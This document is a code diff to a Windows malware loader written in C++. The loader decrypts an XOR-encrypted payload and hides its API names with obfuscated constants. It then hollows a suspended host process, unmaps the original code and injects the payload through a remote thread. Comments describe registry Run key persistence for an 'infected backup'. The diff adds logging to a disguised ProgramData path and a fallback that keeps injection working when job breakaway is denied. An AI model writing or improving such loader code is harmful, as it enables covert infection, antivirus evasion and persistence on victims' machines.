@@ -87,6 +87,22 @@ static constexpr EncName EN_CRT  {"CreateRemoteThread"};
 static constexpr EncName EN_UNMAP{"NtUnmapViewOfSection"};
 static constexpr EncName EN_NCTE {"NtCreateThreadEx"};
 
+// debug-only trace of every loader exit path -- production builds emit nothing
+#ifdef DEBUG
+static void LLog(const char* msg, DWORD err){
+    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
+    HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
+        GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
+    if(el!=INVALID_HANDLE_VALUE){
+        SetFilePointer(el,0,NULL,FILE_END);
+        char m2[300]; int n2=wsprintfA(m2,"loader: %s (err=%u)\r\n",msg,err);
+        DWORD w2; WriteFile(el,m2,n2,&w2,NULL); CloseHandle(el);
+    }
+}
+#else
+static void LLog(const char*, DWORD){}
+#endif
+
 // ------------------------------------------------------------------ persistence (loader-side)
 // Installs a registry Run key pointing at the hidden infected backup so the payload
 // re-runs on every login. Done HERE and not in the payload: the hollowed process
@@ -312,22 +328,22 @@ int wmain(int argc,wchar_t** argv){
     }
 
     if(!target){
-        return 1;
+        LLog("no -p target and no appended host",0); return 1;
     }
 
     // 1. Host must be a native PE64 (no .NET / PyInstaller / 32-bit)
     HANDLE hf = CreateFileW(target,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
-    if(hf==INVALID_HANDLE_VALUE){ return 2; }
+    if(hf==INVALID_HANDLE_VALUE){ LLog("host open failed",GetLastError()); return 2; }
     BYTE hdr[4096]; DWORD rd=0; ReadFile(hf,hdr,sizeof(hdr),&rd,NULL);
     PIMAGE_NT_HEADERS hn=Nt(hdr);
-    if(!hn){ return 2; }
-    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ return 2; }
+    if(!hn){ LLog("host PE parse failed",0); return 2; }
+    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ LLog("host not x64",0); return 2; }
     CloseHandle(hf);
     if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
 
     // 2. Decrypt the XOR-encrypted payload and patch sentinels
     BYTE* g_payload = DecryptPayload();
-    if(!g_payload){ return 6; }
+    if(!g_payload){ LLog("DecryptPayload failed",0); return 6; }
 
     // 3. Resolve suspicious APIs dynamically (removes them from IAT);
     //    names decoded from obfuscated constants so no plaintext lands in .rdata
@@ -340,14 +356,22 @@ int wmain(int argc,wchar_t** argv){
     tUnmap unmap=(tUnmap)ProcObf(nt, EN_UNMAP);
     tNCTE  ncte=(tNCTE)ProcObf(nt, EN_NCTE);
     if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
-        free(g_payload); return 7;
+        LLog("API resolve failed",0); free(g_payload); return 7;
     }
 
     // 4. Create sacrificial process in suspended state
+    // CREATE_BREAKAWAY_FROM_JOB keeps the payload alive after the loader is killed,
+    // but it fails with ERROR_ACCESS_DENIED when the loader itself runs inside a job
+    // that disallows breakaway (Steam and other game launchers do this) -- in that
+    // case retry without the flag; the payload then dies with the loader's job.
     STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
     si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
     if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
-        free(g_payload); return 3;
+        DWORD ce=GetLastError();
+        if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){
+            LLog("CreateProcessW hollow target failed",ce); free(g_payload); return 3;
+        }
+        LLog("breakaway denied, created without it",ce);
     }
 
     // 5. Unmap the host's original code (NtUnmapViewOfSection)
@@ -358,7 +382,7 @@ int wmain(int argc,wchar_t** argv){
     SIZE_T sz=pn->OptionalHeader.SizeOfImage;
     PVOID base=pVirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                               MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
-    if(!base){ TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
+    if(!base){ LLog("VirtualAllocEx failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
     SIZE_T wr=0;
     pWriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
     PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
@@ -406,23 +430,28 @@ int wmain(int argc,wchar_t** argv){
     HANDLE th=NULL;
     ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
     BOOL spawned=FALSE;
+    LLog("inject: imagebase+size+entry",(DWORD)((ULONG_PTR)base & 0xFFFFFFFF));
     if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
                             (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
-                            (PVOID)arg,NULL,0x1/*HIDE_FROM_DEBUGGER*/,0,0,NULL) >= 0;
+                            (PVOID)arg,NULL,0x0,0,0,NULL) >= 0;
+    if(spawned) LLog("thread via NtCreateThreadEx",0);
     if(!spawned && pCreateRemoteThread){
         th=pCreateRemoteThread(pi.hProcess,NULL,0,
             (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
             (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
+        if(spawned) LLog("thread via CreateRemoteThread",0);
     }
-    if(!spawned){ TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }
+    if(!spawned){ LLog("remote thread create failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }
 
     // 9. Payload does its work on the remote thread.
     //    DO NOT resume the main thread -- the original entry point was unmapped
     //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
     //    entire process (and the payload with it). The remote thread runs on its own.
     WaitForSingleObject(th,wait);
+    DWORD xc=0; GetExitCodeThread(th,&xc);
+    LLog("remote thread exit code",xc);
     if(kill) TerminateProcess(pi.hProcess,0);
     CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
     free(g_payload);
-    return 0;
+    LLog("loader OK, payload thread finished",0); return 0;
 }
